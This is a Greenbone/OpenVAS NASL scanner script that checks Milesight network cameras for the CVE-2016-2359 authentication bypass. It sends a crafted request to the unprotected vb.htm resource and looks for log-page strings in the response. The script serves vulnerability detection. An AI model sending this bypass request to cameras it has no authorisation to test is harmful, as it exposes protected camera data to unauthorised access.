if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.114161" );
	script_version( "2021-09-08T08:01:40+0000" );
	script_tag( name: "last_modification", value: "2021-09-08 08:01:40 +0000 (Wed, 08 Sep 2021)" );
	script_tag( name: "creation_date", value: "2019-11-04 13:02:47 +0100 (Mon, 04 Nov 2019)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-29 13:19:00 +0000 (Tue, 29 Oct 2019)" );
	script_cve_id( "CVE-2016-2359" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Milesight Network Cameras Authentication Bypass Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2019 Greenbone Networks GmbH" );
	script_family( "Default Accounts" );
	script_dependencies( "gb_milesight_camera_detect.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "milesight/network_camera/detected" );
	script_tag( name: "summary", value: "Milesight Network Cameras are prone to an authentication
  bypass vulnerability." );
	script_tag( name: "insight", value: "Remote attackers are allowed to bypass authentication
  and access a protected resource by simultaneously making a request for the unprotected vb.htm resource." );
	script_tag( name: "vuldetect", value: "Tries to exploit the vulnerability by displaying
  a certain set of strings, which usually requires authentication." );
	script_tag( name: "affected", value: "All Milesight Network Cameras." );
	script_tag( name: "solution", value: "According to the security researchers, Milesight
  has already fixed this vulnerability. Make sure to update to the latest version." );
	exit( 0 );
}
CPE = "cpe:/h:milesight:network_camera";
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( port: port, cpe: CPE )){
	exit( 0 );
}
url = "/vb.htm?checkpassword=&page=logs&main_type=-1&sub_type=-1";
req = http_get_req( port: port, url: url );
res = http_keepalive_send_recv( port: port, data: req );
if(ContainsString( res, "checkpassword" ) && ContainsString( res, "page" ) && ContainsString( res, "main_type" ) && ContainsString( res, "sub_type" )){
	report = "It was possible to bypass authentication.";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

